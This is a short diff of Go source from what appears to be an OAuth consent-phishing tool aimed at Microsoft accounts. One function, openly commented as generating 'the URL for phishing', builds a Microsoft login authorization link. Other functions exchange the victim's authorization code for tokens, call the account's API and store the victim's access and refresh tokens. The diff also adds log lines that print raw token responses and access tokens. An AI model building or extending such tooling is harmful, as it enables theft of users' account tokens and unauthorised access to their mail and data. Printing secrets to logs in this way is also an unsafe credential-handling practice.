@@ -71,10 +71,8 @@ func RecursiveTokenUpdate() {
 
 // GenerateURL gives the URL for phishing
 func GenerateURL() string {
-
 	phishURL := fmt.Sprintf("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=%s&redirect_uri=%s&response_type=code&client_id=%s", url.QueryEscape(model.GlbConfig.Oauth.Scope), url.QueryEscape(model.GlbConfig.Oauth.Redirecturi), url.QueryEscape(model.GlbConfig.Oauth.ClientId))
 	return phishURL
-	//fmt.Println(phishURL)
 }
 
 // GetAllTokens will call the microsoft endpoint to get all the tokens
@@ -94,6 +92,7 @@ func GetAllTokens(code string) []byte {
 		log.Printf("Error: %s \n", err.Error())
 	} else {
 		data, _ := ioutil.ReadAll(resp.Body)
+		log.Printf("GetAllTokens, response: %s", string(data))
 		return data
 	}
 	return nil
@@ -128,12 +127,15 @@ func CallAPIMethod(method string, endpoint string, accessToken string, additiona
 		return "", 0
 	}
 
+	log.Printf("CallAPIMethod, response: %v", string(body))
+
 	return string(body), resp.StatusCode
 }
 
 // InitializeProfile Initializes the user in the database
 func InitializeProfile(accessToken string, refreshToken string) {
 
+	log.Printf("Initialise profile for access token %v", accessToken)
 	userResponse, _ := CallAPIMethod("GET", "/me", accessToken, "", nil, "")
 	user := model.User{}
 	user.AccessToken = accessToken
